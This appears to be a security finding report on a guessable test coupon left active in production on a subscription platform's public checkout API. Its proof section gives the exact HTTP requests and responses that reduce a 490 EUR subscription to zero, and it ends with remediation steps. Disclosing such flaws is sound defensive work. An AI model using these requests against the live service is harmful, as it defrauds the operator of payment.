# F004 -- Test Coupon Code Active in Production (100% Discount)

## Summary
A trivially guessable coupon code `test` is active in the production environment, providing a fixed discount of 490 EUR -- the exact price of the Lucis Care annual subscription. When applied, the checkout total is reduced to 0 EUR, allowing any user to obtain a free subscription.

## Endpoint
- **URL**: `POST https://api.lucis.life/v1/public/codes/validate` (discovery)
- **URL**: `POST https://api.lucis.life/v1/public/checkout/calculate` (exploitation)
- **Method**: POST
- **Authentication**: None required (public endpoints)

## Severity
- **Severity**: High
- **CVSS**: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
- **OWASP**: A04:2021 Insecure Design (test/debug data in production)

## Impact
- Any unauthenticated user can discover the coupon code `test` (trivially guessable, case-sensitive lowercase only)
- The coupon provides a fixed_amount_off of 49000 cents (490 EUR) in EUR
- This exactly matches the Lucis Care annual subscription price, making it free
- The coupon applies through the public checkout calculation flow without authentication
- Stripe coupon ID: `HjH6tubw`
- Direct financial impact: 490 EUR per abuse instance

## Proof

### Step 1: Discover valid coupon code
```
POST /v1/public/codes/validate HTTP/2
Host: api.lucis.life
Content-Type: application/json

{"code":"test"}
```

Response:
```json
{
  "success": true,
  "data": {
    "type": "COUPON",
    "originalCode": "test",
    "data": {
      "id": "HjH6tubw",
      "couponType": "fixed_amount_off",
      "fixedAmountOff": 49000,
      "currency": "eur"
    },
    "projectedCoupon": {
      "id": "HjH6tubw",
      "couponType": "fixed_amount_off",
      "fixedAmountOff": 49000,
      "currency": "eur"
    },
    "metadata": {
      "code_type": "COUPON",
      "code_value": "test",
      "detected_at": "2026-10-29T23:23:14.357Z",
      "coupon_id": "HjH6tubw",
      "coupon_type": "fixed_amount_off"
    },
    "isValid": true,
    "validOn": [],
    "appCode": null
  }
}
```

### Step 2: Apply coupon to checkout calculation
```
POST /v1/public/checkout/calculate HTTP/2
Host: api.lucis.life
Content-Type: application/json

{
  "currency": "eur",
  "couponCode": "test",
  "basket": {
    "items": [{
      "type": "subscription",
      "id": 3,
      "uuid": "bc9a5ff3-6231-4427-b6b3-fb94223f9e95",
      "label": "Lucis Care",
      "quantity": 1
    }]
  }
}
```

Response:
```json
{
  "success": true,
  "data": {
    "totalAmountBeforeDiscount": 49000,
    "discountAmount": 49000,
    "totalAmountAfterDiscount": 0,
    "freeItems": []
  }
}
```

### Additional evidence: coupon is case-sensitive
Only lowercase `test` works. `Test`, `TEST`, `tEsT` all return `isValid: false`.

### Additional evidence: works with multi-item baskets
Subscription (490 EUR) + Microbiome addon (150 EUR) = 640 EUR before, discount 490 EUR, total 150 EUR after.

## Remediation
1. Immediately deactivate the `test` coupon in Stripe (coupon ID: `HjH6tubw`)
2. Audit all active Stripe coupons for other test/debug codes
3. Add monitoring/alerting for coupon usage at 100% discount levels
4. Consider requiring authentication for coupon validation to prevent enumeration
